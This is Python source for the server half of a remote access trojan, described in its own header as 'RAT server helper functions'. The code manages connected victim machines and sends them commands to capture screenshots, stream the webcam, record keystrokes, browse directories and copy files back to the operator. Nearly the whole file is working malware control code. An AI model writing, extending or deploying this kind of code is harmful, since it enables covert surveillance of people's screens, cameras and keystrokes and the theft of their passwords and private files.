# RAT server helper functions

from socket import *
import os
import threading
import struct
import pickle
import time
from pathlib import Path
import numpy
import cv2

class CommandError(Exception):
    def __init__(self, msg):
        self._msg = "\n" + msg + "\n"

    @property
    def msg(self):
        return self._msg

class ServerShutdown(Exception):
    def __init__(self, msg):
        self._msg = "\n" + msg + "\n"

    @property
    def msg(self):
        return self._msg

# add new lines around message for clearer reading
def print_server_msg(msg: str):
    print("\n" + msg + "\n")
    return
            

class Server():
    def __init__(self, server_socket):
        self._server_socket = server_socket
        self._server_on = True
        self._connections = {}      # { (ip address, port) : socket }
        
        self._keylogged = []        # list of connections that are currently being keylogged (ip address, port)
        self._lock = threading.Condition()
        self._SERVER_IP = "localhost"
        self._SERVER_PORT = 9090
        
        Path("screenshots").mkdir(parents=True, exist_ok=True)
        Path("keylogs").mkdir(parents=True, exist_ok=True)
        Path("files").mkdir(parents=True, exist_ok=True)
    
    @property
    def server_socket(self):
        return self._server_socket
    
    @property
    def on(self):
        return self._server_on
        
    @property
    def lock(self):
        return self._lock
        
    @property
    def addrs(self):
        return list(self._connections.keys())

    def new_connection(self, addr, client_socket):
        # convert port to string to more easily compare command line input
        conn_key = (addr[0], str(addr[1]))
        self._connections[conn_key] = client_socket


    def send(self, client_socket, data):
        msg = pickle.dumps(data)
        msg_len = str(len(msg)).zfill(1024).encode()
        client_socket.sendall(msg_len + msg)

    
    def receive(self, client_socket, msg_len):
        # print("receiving message")

        if msg_len <= 4096:
            return pickle.loads(client_socket.recv(msg_len))
        
        received = 0
        msg = b''
        
        while received < msg_len:
            if msg_len - received > 4096:
                msg += client_socket.recv(4096)
                received += 4096
            else:
                msg += client_socket.recv(msg_len - received)
                received = msg_len
               
        return pickle.loads(msg)


    def receive_file(self, filename, client_socket):
        filesize = int(client_socket.recv(1024).decode())
        with open(filename, "wb") as f:
            current_size = 0
            while current_size < filesize:
                file_content = client_socket.recv(4096)

                if not file_content:
                    break

                if len(file_content) + current_size > filesize:
                    file_content = file_content[:filesize-current_size]
                
                f.write(file_content)
                current_size += len(file_content)
    
    def show_connections(self, command):
        for k,v in self._connections.keys():
            print("IP: {} port: {}".format(k,v))

    def exit(self, msg):
        self._on = False
        data = {"command":"exit"}
        # send shutdown message to all clients
        for conn in self._connections.values():
            self.send(conn, data)
        
        raise ServerShutdown("Server shutting down")

    def screenshot(self, command):
        args = command.split()
        
        if len(args) != 3:
            raise CommandError("Usage: screenshot <IP> <port>")
        
        conn_key = (args[1],args[2])
        
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
        
        data = {"command":"screenshot"}
        
        client_socket = self._connections[conn_key]

        self.send(client_socket, data)
        
        filename = "screenshots/Screenshot_{}_{}_{}.png".format(args[1], args[2], time.time())
        
        self.receive_file(filename, client_socket)
               
    def webcam(self, command):
        args = command.split()
        
        if len(args) != 3:
            raise CommandError("Usage: screenshot <IP> <port>")
        
        conn_key = (args[1],args[2])
        
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
        
        # set up a new socket to receive webcam data
        print("setting up a video socket")
        video_socket = socket(AF_INET, SOCK_STREAM)
        video_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        video_socket.bind((self._SERVER_IP, 9999))
        video_socket.listen()

        data = {"command":"webcam"}

        client_socket = self._connections[conn_key]
        self.send(client_socket, data)
        client_video, addr = video_socket.accept()

        print("connected to client video")

        while 1:
            video_frame = b''
            current_size = 0
            framesize = int(client_video.recv(1024).decode())
            while current_size < framesize:
                curr = client_video.recv(4096)

                if not curr:
                    break

                if len(curr) + current_size > framesize:
                    curr = curr[:framesize-current_size]
                
                video_frame += curr
                current_size += len(curr)

            loaded_frame = pickle.loads(video_frame)
            cv2.imshow('frame',loaded_frame)
            cv2.waitKey(1)
            if cv2.getWindowProperty('frame', cv2.WND_PROP_VISIBLE) < 1:
                # send 1 byte to client socket to tell them stream ended
                client_socket.send("1".encode())        # end
                break
            else:
                client_socket.send("2".encode())        # continue
        
        ack = client_socket.recv(1)
        video_socket.close()
    
    def keylog(self, command):
        args = command.split()
        accepted = ["start","receive","stop"]
        
        if len(args) != 4 or args[1] not in accepted:
            raise CommandError("Usage: screenshot <start|receive|stop> <IP> <port>")
        
        conn_key = (args[2],args[3])
        
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
            
        if args[1] == "start":
            if conn_key in self._keylogged:
                raise CommandError("{} is already being keylogged".format(conn_key))
            else:
                self._keylogged.append(conn_key)
                print("Keylogging {}".format(conn_key))
        elif args[1] == "receive" or args[1] == "stop":
            if conn_key not in self._keylogged:
                raise CommandError("{} is not being keylogged right now".format(conn_key))
        
        data = {"command":"keylog","flag":args[1]}
        
        # send the data
        client_socket = self._connections[conn_key]
        self.send(client_socket, data)
            
        
        # if the command is receive/stop
        # receive the file + add timestamp
        if args[1] == "receive" or args[1] == "stop":
            filename = "keylogs/keylog_{}_{}_{}".format(args[2], args[3], time.time())
            
            # receive the file
            self.receive_file(filename, client_socket)
            
            if args[1] == "stop":
                self._keylogged.remove(conn_key)
                
    def pwd(self, command):
        args = command.split()
        
        if len(args) != 3:
            raise CommandError("Usage: pwd <IP> <port>")
        
        conn_key = (args[1],args[2])
        
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
        
        data = {"command":"pwd"}
        
        client_socket = self._connections[conn_key]

        self.send(client_socket, data)
        
        msg_len = int(client_socket.recv(1024).decode())
        
        msg = self.receive(client_socket, msg_len)
        
        print(msg)
            
    def ls(self, command):
        args = command.split()
        
        if len(args) != 3:
            raise CommandError("Usage: ls <IP> <port>")
        
        conn_key = (args[1],args[2])
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
        
        data = {"command":"ls"}

        client_socket = self._connections[conn_key]
        self.send(client_socket, data)
        
        msg_len = int(client_socket.recv(1024).decode())
        
        msg = self.receive(client_socket, msg_len)
        
        s = "\n"
        
        print(s.join(msg))
    
    def cd(self, command):
        args = command.split()
        
        if len(args) != 4:
            raise CommandError("Usage: cd <path> <IP> <port>")
        
        conn_key = (args[2],args[3])
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
        
        data = {"command":"cd","path":args[1]}

        client_socket = self._connections[conn_key]
        self.send(client_socket, data)
        
        msg_len = int(client_socket.recv(1024).decode())
        
        msg = self.receive(client_socket, msg_len)
        
        print(msg)
        
    # copy file from client to server
    def copy(self, command):
        args = command.split()
        
        if len(args) != 4:
            raise CommandError("Usage: copy <file> <IP> <port>")
        
        conn_key = (args[2],args[3])
        if conn_key not in self.addrs:
            raise CommandError("Invalid IP address or port")
            
        data = {"command":"copy","filename":args[1]}
        
        client_socket = self._connections[conn_key]
        self.send(client_socket, data)
        
        msg_len = int(client_socket.recv(1024).decode())
        msg = self.receive(client_socket, msg_len)
        
        if msg != "success":
            print("Could not copy file {} from client".format(args[1]))
            return
        
        filename = "files/{}".format(args[1])
        
        # receive the file
        self.receive_file(filename, client_socket)
    
    def help(self, command):
        args = command.split()
        
        if len(args) != 1:
            raise CommandError("Usage: help")
        
        print("connections: show all connections to server")
        print("screenshot <IP> <port>: screenshot a given clients screen")
        print("webcam <IP> <port>: stream a given clients webcam")
        print("keylog <start|receive|stop> <IP> <port>: keylog a client, stop|receive transfers keylog file to server")
        print("pwd <IP> <port>: show current working directory of client")
        print("ls <IP> <port>: show files in working directory of client")
        print("cd <IP> <port>: change working directory of client")
        print("copy <filename> <IP> <port>: copy file from client to server")
        print("exit: quit the server and disconnect clients")